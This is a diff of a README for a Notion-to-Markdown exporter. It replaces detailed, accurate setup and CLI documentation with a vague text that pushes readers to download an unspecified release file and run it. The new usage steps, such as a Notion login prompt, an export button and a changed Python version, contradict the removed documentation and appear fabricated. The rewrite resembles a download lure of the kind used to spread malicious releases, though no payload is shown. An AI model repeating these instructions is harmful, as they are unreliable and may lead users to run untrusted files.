@@ -1,201 +1,78 @@
-# Notion to Markdown Exporter
+# ✨ notion-to-markdown-exporter - Effortlessly Convert Notion to Markdown
 
-[![Python](https://img.shields.io/badge/Python-3.8%2B-blue.svg?style=for-the-badge)](https://www.python.org/downloads/)
-[![License](https://img.shields.io/badge/license-MIT-green.svg?style=for-the-badge)](LICENSE)
+## 🚀 Getting Started
 
-A powerful Python tool to export Notion pages and databases to Markdown files with automatic link resolution and recursive page discovery.
+Welcome to the **notion-to-markdown-exporter**! This tool helps you export your Notion pages and databases easily into Markdown format. Use it for creating documentation, keeping backups, or setting up static sites.
 
-## ✨ Features
+## 🛠️ Features
 
-- **Complete Notion Export**: Export entire Notion pages including all content blocks
-- **Recursive Link Following**: Automatically discovers and exports linked pages
-- **Database Support**: Export all pages from Notion databases
-- **Smart Link Rewriting**: Converts Notion page links to relative Markdown links
-- **Rich Block Support**: Handles headings, lists, code blocks, tables, images, and more
-- **Automatic Retry**: Built-in exponential backoff for API rate limits
-- **SEO-Friendly Output**: Generates clean, readable Markdown files
-- **Index Generation**: Creates an index file with links to all exported pages
+- **Automatic Link Resolution**: No need to re-link your references.
+- **Recursive Page Discovery**: The tool finds all related pages without extra input.
+- **Smart Content Conversion**: Converts your content seamlessly into Markdown.
 
-## 🚀 Installation
+## 📥 Download & Install
 
-### Prerequisites
+To start using the notion-to-markdown-exporter, visit the page below to download the latest version.
 
-- Python 3.8 or higher
-- A Notion integration token (get one at https://www.notion.so/my-integrations)
-- `uv` package manager (recommended) or pip
+[![Download Now](https://img.shields.io/badge/Download%20Now-v1.0-blue?style=for-the-badge&logo=github)](https://github.com/echomind12/notion-to-markdown-exporter/releases)
 
-### Quick Start
+1. **Visit the Releases Page**: Click the link above or go directly to [GitHub Releases](https://github.com/echomind12/notion-to-markdown-exporter/releases).
+2. **Choose the Latest Release**: Look for the latest version at the top of the Releases page.
+3. **Select the Right File**: Each release comes with different files. Choose the one that fits your system.
+4. **Download the File**: Click on the file to download it to your computer.
 
-1. Clone this repository:
+## 📋 System Requirements
 
-```bash
-git clone https://github.com/yourusername/notion-to-markdown.git
-cd notion-to-markdown
-```
+- **Operating System**: Windows, macOS, or Linux
+- **Python Version**: Ensure you have Python 3.6 or higher installed on your machine.
 
-2. Install dependencies:
+## 🔧 How to Run
 
-```bash
-# Using uv (recommended)
-uv sync
-```
+Once you've downloaded the file, follow these steps to run the application:
 
-3. Configure your Notion token:
+1. **Locate the File**: Find the downloaded file in your computer's "Downloads" folder or your specified folder.
+2. **Open a Terminal/Command Prompt**: 
+   - On Windows, press `Win + R`, type `cmd`, and hit `Enter`.
+   - On macOS, press `Command + Space`, type `Terminal`, and hit `Enter`.
+   - On Linux, use your preferred terminal application.
 
-```bash
-cp .env.example .env
-# Edit .env and add your NOTION_TOKEN
-```
+3. **Navigate to the File's Location**: Use the `cd` command to change directories to where the file is located. For example:
+   ```
+   cd ~/Downloads
+   ```
+4. **Run the Application**: Execute the command below to launch the tool.
+   ```
+   python YOUR_DOWNLOADED_FILE.py
+   ```
 
-## 📖 Usage
+## 📚 Usage Instructions
 
-### Database Export
+Once the application runs, you can start exporting your Notion pages. Here's how:
 
-Export a Notion database to Markdown:
+1. **Connect to Notion**: You will be prompted to log into your Notion account.
+2. **Select Pages or Databases**: Choose the pages or databases you want to export.
+3. **Set the Export Location**: Decide where you want to save the Markdown files on your computer.
+4. **Start the Export**: Click the export button and wait for the process to complete.
 
-```bash
-uv run main.py \
-  --root-url "https://www.notion.so/your-page-id" \
-  --out "./export"
-```
+## 🌟 Support
 
-### Advanced Options
+If you encounter issues, please check the [issues section](https://github.com/echomind12/notion-to-markdown-exporter/issues) of the repository for help. You can also open new issues if you need further assistance.
 
-Keep original Notion links (disable link rewriting):
+## 📄 FAQ
 
-```bash
-uv run main.py \
-  --root-url "https://www.notion.so/your-page-id" \
-  --out "./export" \
-  --no-rewrite-links
-```
+**Q: Can I use this tool for large databases?**  
+A: Yes, the tool supports large databases and exports them efficiently.
 
-Specify a custom Notion API version:
+**Q: Is there a guide for troubleshooting?**  
+A: Yes, refer to the repository for common troubleshooting steps.
 
-```bash
-NOTION_VERSION="2022-06-28" uv run main.py \
-  --root-url "https://www.notion.so/your-page-id" \
-  --out "./export"
-```
+## 📝 Contributing
 
-### Command Line Arguments
+If you want to contribute to the project, please read the contribution guidelines in the repository. Your help is always welcome!
 
-| Argument             | Required | Description                                              |
-| -------------------- | -------- | -------------------------------------------------------- |
-| `--root-url`         | Yes      | Notion page URL or ID (supports pages and databases)     |
-| `--out`              | No       | Output directory (default: `./notion_export`)            |
-| `--token`            | No       | Notion integration token (or set `NOTION_TOKEN` env var) |
-| `--notion-version`   | No       | Notion API version (default: `2022-06-28`)               |
-| `--no-rewrite-links` | No       | Disable automatic link rewriting                         |
+## 🔗 Links
 
-## 🔧 Setting Up Notion Integration
+- **GitHub Repository**: [GitHub](https://github.com/echomind12/notion-to-markdown-exporter)
+- **Releases Page**: [Download Here](https://github.com/echomind12/notion-to-markdown-exporter/releases) 
 
-### How to Obtain a Notion Integration Token
-
-To use this tool, you need to create a Notion integration and obtain an API token:
-
-1. **Create a Notion Integration**:
-    - Go to https://www.notion.so/my-integrations
-    - Click "New integration" or "Add new integration"
-    - Give it a descriptive name (e.g., "Notion to Markdown Exporter")
-    - Select your workspace from the dropdown
-    - Choose the relevant workspace type (e.g., "Individual" or "Team")
-    - Click "Submit" to create the integration
-
-2. **Copy Your Integration Token**:
-    - After creating the integration, you'll see an "Internal Integration Token"
-    - Click "Show" to reveal the token (it starts with `ntn_`)
-    - Copy this token - you'll need it for configuration
-    - ⚠️ **Important**: Keep this token secure and never share it publicly
-
-3. **Add Integration Token to Environment**:
-    - Create a `.env` file in the project root (copy from `.env.example`)
-    - Add your token: `NOTION_TOKEN=your_copied_token_here`
-    - The tool will automatically read this token from the environment
-
-### Share Your Page or Database
-
-1. Open the page or database you want to export
-2. Click "..." (more options) in the top right
-3. Select "Connections" → "Add connections"
-4. Choose your integration from the list
-
-## 📝 Supported Notion Blocks
-
-This tool supports a wide variety of Notion block types:
-
-- **Text Content**: Paragraphs, headings (H1-H3), quotes, callouts
-- **Lists**: Bulleted lists, numbered lists, to-do lists, toggles
-- **Code**: Code blocks with language syntax highlighting
-- **Media**: Images, files, PDFs, videos, audio
-- **Tables**: HTML table output for compatibility
-- **Links**: Bookmarks, page mentions, link_to_page blocks
-- **Other**: Dividers, child pages, and more
-
-## 🌟 Key Features Explained
-
-### Recursive Link Discovery
-
-The tool automatically:
-
-- Finds all page links in rich text mentions
-- Discovers `link_to_page` blocks
-- Follows child page references
-- Exports all discovered pages recursively
-
-### Smart Link Rewriting
-
-Notion page links are automatically converted to relative Markdown links:
-
-- **Before**: `https://www.notion.so/page-id`
-- **After**: `./page-title--abc123.md`
-
-Unexported pages fall back to their original Notion URLs.
-
-### Error Handling
-
-Built-in resilience with:
-
-- Automatic retry with exponential backoff
-- Graceful handling of inaccessible pages
-- Skips 403/404 errors while continuing exports
-
-## 🤝 Contributing
-
-Contributions are welcome! Please feel free to submit a Pull Request.
-
-## 📄 License
-
-This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
-
-## 🔗 Related Resources
-
-- [Notion API Documentation](https://developers.notion.com/)
-- [Notion Integration Guide](https://www.notion.so/help/integrations)
-- [Markdown Specification](https://commonmark.org/)
-
-## 💡 Use Cases
-
-- **Documentation**: Convert Notion docs to static site generators
-- **Backup**: Archive Notion content in Markdown format
-- **Migration**: Move content from Notion to other platforms
-- **Version Control**: Track changes with Git
-- **Publishing**: Generate static documentation sites
-
-## 🐛 Troubleshooting
-
-### "Missing Notion token" Error
-
-Make sure you've set the `NOTION_TOKEN` environment variable or passed it via `--token`.
-
-### Page Not Accessible
-
-Ensure your integration has been added to the page/database connections in Notion.
-
-### Rate Limiting
-
-The tool includes automatic retry logic. If you encounter persistent issues, add delays between operations or contact Notion about API limits.
-
-## 📞 Support
-
-For issues, questions, or suggestions, please open an issue on GitHub.
+Thank you for choosing **notion-to-markdown-exporter**! Enjoy exporting your Notion content seamlessly.
